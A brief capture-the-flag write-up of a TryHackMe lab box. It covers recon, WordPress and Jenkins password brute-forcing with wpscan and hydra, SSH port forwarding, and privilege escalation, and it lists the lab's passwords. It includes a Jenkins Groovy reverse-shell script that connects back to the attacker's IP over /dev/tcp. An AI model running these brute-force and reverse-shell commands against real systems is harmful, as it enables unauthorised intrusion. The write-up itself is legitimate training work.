tryhackme box (Hard)

## Recon
did an nmap scan on the target to get the output as 2 open ports.

open_ports: http(80) and ssh(22)

gobuster scan on the target on port 80 revealed a wordpress site on the url `/blog`. So I added the ip to hosts and reloaded the site.

In the meantime enumerate for users using wpscan.

## Enumeration
`wpscan --url HOST-IP/blog --enumerate`

The enumeration for the users only gave up 1 username i.e. `admin`

Running a brute-force with wpscan on the target with username `admin` we get the password.

`wpscan --url HOST-IP/blog --usernames admin --passwords rockyou.txt`

Starting from brute-force on wordpress site.

It found a match.
`admin : my2boys` --> wordpress

## Exploiting jenkins
Uploaded a reverse shell to themes and trigger a reverse shell.

Got reverse shell and did alot of snooping around even the linpeas.sh didn't work. So, I looked at a writeup to find a hidden file in `/opt`.

That file gave a password to the user aubreanna. I log into that and there was note in there that said:

`Internal Jenkins service is running on 172.17.0.2:8080`

We port forward everything going here to our local machine.

`ssh -L 1234:localhost:8080 aubreanna@internal.thm`

I can open a jenkins site now on the localhost:1234.
brute-forcing the password to this jenkins site using hydra.

`hydra -l admin -P rockyou.txt -u localhost -s 1234 http-get`

We get the creds for that
`admin : spongebob` --> jenkins

## Getting the root shell
After snooping around there, I goto `run script` under `manage jenkins` tab.
There I ran a script to get a `java reverse shell` running.

`
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.14.13.156/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
`

I wasn't finding anything like config files. So I ran a search for txt files.

`find -name *.txt 2>/dev/null`

I find a `note.txt` in the directory `/opt`.

In the note was password to the root account.

`root : tr0ub13guM!@#123`

Now we can get both the flags.